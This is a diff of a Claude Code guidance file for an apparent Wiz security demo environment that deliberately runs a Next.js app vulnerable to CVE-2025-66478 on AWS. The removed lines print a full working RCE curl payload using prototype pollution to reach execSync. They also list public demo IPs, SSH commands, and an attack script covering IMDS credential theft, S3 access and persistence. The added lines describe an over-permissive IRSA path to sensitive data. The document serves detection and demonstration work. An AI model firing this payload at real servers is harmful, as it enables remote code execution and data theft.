@@ -4,225 +4,100 @@ This file provides guidance to Claude Code (claude.ai/code) when working with th
 
 ## Project Overview
 
-This is a **Wiz security demo environment** showcasing the React Server Components RCE vulnerability (React2Shell, CVE-2025-66478). The demo runs on AWS EC2 with Terraform IaC.
+This is a **Wiz security demo environment** showcasing the **React Server Components RCE vulnerability (React2Shell, CVE-2025-66478)** running on **AWS EKS**.
 
 ### Demo Purpose
 
 Demonstrates Wiz platform capabilities:
-- **Wiz Code**: IDE & repo scanning for vulnerable packages and risky IaC
-- **Wiz Cloud**: Agentless CNAPP-style discovery and graph visualization
-- **Wiz Defend / Wiz Sensor**: Runtime detection of RCE behavior
-- **Wiz CLI**: Code-to-cloud context and CI scanning
+- **Wiz Cloud**: Graph visualization of "Toxic Combinations" (Public Exposure + Vulnerability + Identity + Sensitive Data).
+- **Wiz Defend (Sensor)**: Runtime detection of RCE behavior and lateral movement.
+- **Wiz Code**: Detection of vulnerable dependencies (`next@16.0.6`) and risky IaC.
 
-### Attack Path Narrative
+### Current Architecture (Golden State)
 
-```
-Amazon Linux Container:  Internet → 54.206.239.140:3000 → Docker (RCE) → IMDS → IAM Role → S3
-Amazon Linux Native:     Internet → 54.206.239.140:3001 → EC2 Host (RCE) → IMDS → IAM Role → S3
-Ubuntu Native:           Internet → 52.62.49.203:80    → EC2 Host (RCE) → IMDS → IAM Role → S3
-```
+**Attack Path:**
+`Internet (0.0.0.0/0)` → `NLB` → `EKS Service` → `Pod (RCE)` → `Service Account (IRSA)` → `IAM Role` → `S3 Bucket (Private)`
 
-### Static IPs (Elastic IPs for ASM)
-
-| Instance | IP | Ports |
-|----------|-----|-------|
-| Amazon Linux | 54.206.239.140 | 3000 (container), 3001 (native) |
-| Ubuntu | 52.62.49.203 | 80 (native) |
-
-## Repository Structure
-
-```
-app/nextjs/           # Vulnerable Next.js 16.0.6 application (React 19.2.0)
-infra/aws/            # Terraform: VPC, EC2, S3, ECR, IAM
-wizcli                # Wiz CLI binary
-```
-
-## Development Commands
-
-### Next.js App (Local)
-
-```bash
-cd app/nextjs
-npm install
-npm run dev          # Start dev server at http://localhost:3000
-npm run build        # Production build
-npm run lint         # Run ESLint
-```
-
-### Docker Build
-
-```bash
-cd app/nextjs
-docker build --platform linux/amd64 -t wiz-rsc-demo:latest .
-docker run --rm -p 3000:3000 wiz-rsc-demo:latest
-```
-
-**Note:** Container includes curl, aws-cli, and bash for exploit demo. CVE-2025-66478 RCE works in both dev and production modes.
-
-### Terraform (Infrastructure)
-
-```bash
-cd infra/aws
-terraform init
-terraform plan
-terraform apply      # Outputs: app_url, ec2_public_ip, s3_bucket_name
-terraform destroy
-```
+| Component | Configuration | Status |
+|-----------|---------------|--------|
+| **Cluster** | EKS 1.32 (`wiz-rsc-demo-eks-...`) | ✅ Active |
+| **Workload** | Next.js 16.0.6 (Vulnerable) | ✅ Running |
+| **Exposure** | Public NLB (`0.0.0.0/0`) | ✅ High Exposure |
+| **Identity** | **IRSA** (IAM Roles for Service Accounts) | ✅ Linked |
+| **Role** | `wiz-rsc-sa-role-...` | ✅ Admin + Inline `s3:*` |
+| **Data** | S3 Bucket (Private, Sensitive Data) | ✅ Locked Down |
 
 ## Key Technical Details
 
-### Vulnerable Versions (Intentional)
+### 1. Identity & Permissions (IRSA)
+- **Service Account:** `wiz-rsc-sa` (Namespace: `wiz-demo`)
+- **IAM Role:** `wiz-rsc-sa-role-wiz-2bb14abd`
+- **Trust Policy:** Standard OIDC trust with strict conditions:
+  - `sub`: `system:serviceaccount:wiz-demo:wiz-rsc-sa`
+  - `aud`: `sts.amazonaws.com` (Critical for Wiz Graph validation)
+- **Permissions:** Single **Inline Policy** (`wiz-demo-s3-full-access`) granting `s3:*` on `*`.
+  - *Note:* Managed policies (`AdministratorAccess`) were removed to ensure clean graph edges.
 
-| Package | Version | Notes |
-|---------|---------|-------|
-| Next.js | 16.0.6 | CVE-2025-66478 - RSC deserialization RCE |
-| React | 19.2.0 | Paired with vulnerable Next.js |
+### 2. Sensitive Data (S3)
+- **Bucket:** `wiz-demo-sensitive-data-...-v2`
+- **Access:** **PRIVATE**. Public Access Block is ENABLED.
+- **Content:** Fake PII (SSNs, Credit Cards), API Keys, Medical Records.
+- **Why Private?** To force Wiz Graph to calculate access *exclusively* via the IAM Role, ensuring the "Toxic Combination" alert fires (instead of a generic "Public Bucket" alert).
 
-### Infrastructure Design
+### 3. Vulnerability (React2Shell)
+- **CVE:** CVE-2025-66478
+- **Packages:** `next: 16.0.6`, `react: 19.2.0`
+- **Exploit:** Deserialization RCE via `Next-Action` header.
 
-- **Amazon Linux EC2** (54.206.239.140):
-  - **Container (port 3000)**: `~/start-demo.sh` - pulls from ECR, runs in Docker
-  - **Native (port 3001)**: `~/start-native.sh` - clones repo, builds and runs
-  - SSH: `ssh -i wiz-master-demo.pem ec2-user@54.206.239.140`
-- **Ubuntu EC2** (52.62.49.203):
-  - **Native (port 80)**: `~/start-app.sh` - clones repo, builds and runs
-  - SSH: `ssh -i wiz-master-demo.pem ubuntu@52.62.49.203`
-- **Over-permissive IAM**: Instance profile has S3 read access (lateral movement path)
-- **Public S3 bucket**: Contains fake PII, medical records, API keys
-- **IMDSv1 enabled**: Allows credential theft from container and native apps
-- **Elastic IPs**: Static IPs for ASM tracking
+## Directory Structure
 
-### App Routes
+```
+app/nextjs/           # Vulnerable Application
+infra/aws/            # Terraform (EKS, IAM, S3, VPC)
+  ├── main.tf         # S3, VPC, Logging
+  ├── eks.tf          # EKS Cluster, IRSA Role, Inline Policy
+infra/k8s/            # Kubernetes Manifests
+  ├── deployment.yaml # App Deployment (uses ServiceAccount)
+  ├── service.yaml    # Service (LoadBalancer)
+  ├── deploy.sh       # Build & Deploy script
+wiz-demo-v2.sh        # Attack Scenario Script (The "Red Button")
+```
 
-- `/` – Landing page (changes to "PWNED" when `/tmp/banner.json` exists)
+## Key Commands
 
-### RCE Demo Capabilities
+### Deployment (Clean Reset)
+To rebuild the app and restart pods (wiping any runtime taint):
+```bash
+# Full Rebuild & Deploy
+cd infra/k8s && ./deploy.sh
 
-When exploited via CVE-2025-66478, the app allows:
-1. Recon commands: `whoami`, `id`, `uname -a`, `cat /etc/passwd`
-2. File writes: `/tmp/pwned.txt`, `/tmp/banner.json` (triggers UI change)
-3. AWS access: `aws s3 ls`, `aws s3 cp` using instance IAM role
+# Quick Pod Restart (Wipes /tmp files)
+kubectl rollout restart deployment wiz-rsc-demo -n wiz-demo
+```
 
-## Exploit Payload (CVE-2025-66478)
+### Attack Demo
+Executes the full exploit chain:
+```bash
+# Usage: ./wiz-demo-v2.sh <NLB_DNS> <PORT>
+./wiz-demo-v2.sh $(kubectl get svc wiz-rsc-demo -n wiz-demo -o jsonpath='{.status.loadBalancer.ingress[0].hostname}') 80
+```
 
-Use port 3000 for container, port 3001 for native.
+### Verification
+Check S3 access from within the pod (via IRSA):
+```bash
+kubectl exec -n wiz-demo -it deploy/wiz-rsc-demo -- aws s3 ls s3://$(cd infra/aws && terraform output -raw s3_bucket_name)
+```
+
+## Terraform Management
 
 ```bash
-curl -X POST http://<TARGET>:3000 \
-  -H "Next-Action: x" \
-  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
-  --data-binary $'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
-Content-Disposition: form-data; name="0"\r
-\r
-{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\\"then\\\":\\\"$B1337\\\"}","_response":{"_prefix":"process.mainModule.require('"'"'child_process'"'"').execSync('"'"'YOUR_COMMAND_HERE'"'"');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r
-------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
-Content-Disposition: form-data; name="1"\r
-\r
-"$@0"\r
-------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
-Content-Disposition: form-data; name="2"\r
-\r
-[]\r
-------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r
-'
-```
-
-**Usage:** Replace `YOUR_COMMAND_HERE` with any shell command.
-
-**Notes:**
-- No Action ID needed - use `Next-Action: x` header
-- Single quotes in commands need escaping: `'"'"'`
-- Base64 encoding simplifies complex payloads
-
-## Working Style Rules
-
-1. **One major thing at a time** – Focus on the current task only
-2. **Keep complexity low** – Prefer simple, readable Terraform
-3. **No real secrets** – Use fake/demo data only
-4. **Full-file outputs** – Show complete files, not diffs
-5. **Be explicit about assumptions** – Document version choices
-6. **Respect user pace** – Don't ask "Ready for the next step?" – wait for explicit requests
-
-## Current State
-
-- ✅ Next.js app with vulnerable versions (Next.js 16.0.6, React 19.2.0)
-- ✅ Amazon Linux EC2 with container (port 3000) and native (port 3001)
-- ✅ Ubuntu EC2 with native app (port 80)
-- ✅ Docker container with curl/aws-cli/bash (RCE works in dev and prod)
-- ✅ Elastic IPs for stable ASM tracking
-- ✅ Terraform for EC2 + S3 + IAM + CloudTrail + VPC Flow Logs
-- ✅ S3 bucket with fake PII, medical records, API keys
-- ✅ RCE exploit works (CVE-2025-66478)
-- ✅ Demo script (`wiz-demo.sh`) with 17 attack patterns
-- ✅ Wiz Sensor installed
-- ✅ EKS deployment option (feature/eks-deployment branch)
-
-## EKS Deployment (Optional)
-
-EKS runs in parallel with EC2. Enable with `enable_eks=true` in terraform.tfvars.
-
-### EKS Attack Path
-
-```
-Internet → NLB:80 → EKS Pod (RCE) → IMDS (IMDSv1) → Node IAM Role → S3
-```
-
-### Deploy to EKS
-
-```bash
-# 1. Enable EKS in terraform.tfvars
-echo 'enable_eks = true' >> infra/aws/terraform.tfvars
-
-# 2. Apply Terraform (creates EKS cluster ~15 min)
 cd infra/aws
-terraform apply
-
-# 3. Deploy app to EKS
-cd infra/k8s
-./deploy.sh
-
-# 4. Get the NLB URL
-kubectl get svc wiz-rsc-demo -n wiz-demo
+terraform apply -var "aws_profile=wiz-demo"
 ```
-
-### EKS Configuration
-
-| Setting | Value | Notes |
-|---------|-------|-------|
-| Cluster Version | 1.32 | Standard support until March 2026 |
-| Node Instance | t3.medium | 2 vCPU, 4GB RAM |
-| Node IMDS | IMDSv1 enabled | Credential theft via 169.254.169.254 |
-| Node IAM | S3 read access | Same permissions as EC2 for lateral movement |
-| Ingress | NLB (LoadBalancer Service) | Direct TCP to pods on port 80 |
-
-### EKS Files
-
-```
-infra/aws/eks.tf           # EKS cluster, node group, IAM
-infra/aws/variables.tf     # enable_eks, eks_cluster_version, eks_node_instance_type
-infra/k8s/deployment.yaml  # Kubernetes Deployment + Namespace
-infra/k8s/service.yaml     # LoadBalancer Service (NLB)
-infra/k8s/deploy.sh        # Build, push, deploy script
-```
-
-## Demo Script
-
-Run the consolidated attack demo:
-
-```bash
-./wiz-demo.sh <target-ip> <port>
-
-# Examples:
-./wiz-demo.sh 54.206.239.140 3000   # Amazon Linux container
-./wiz-demo.sh 54.206.239.140 3001   # Amazon Linux native
-./wiz-demo.sh 52.62.49.203 80       # Ubuntu native
-./wiz-demo.sh <nlb-hostname> 80     # EKS via NLB
-```
-
-The script executes 17 attack patterns including RCE, IMDS credential theft, S3 enumeration, OAST callbacks, and persistence mechanisms.
+*Note: Legacy EC2 resources have been removed. The environment is EKS-only.*
 
 ## Security Warning
 
 > **DO NOT DEPLOY TO PRODUCTION**
 >
-> This repository contains intentionally vulnerable code for security demonstration purposes only.
+> This repository contains intentionally vulnerable code (`next@16.0.6`) and over-permissive IAM roles (`s3:*`).
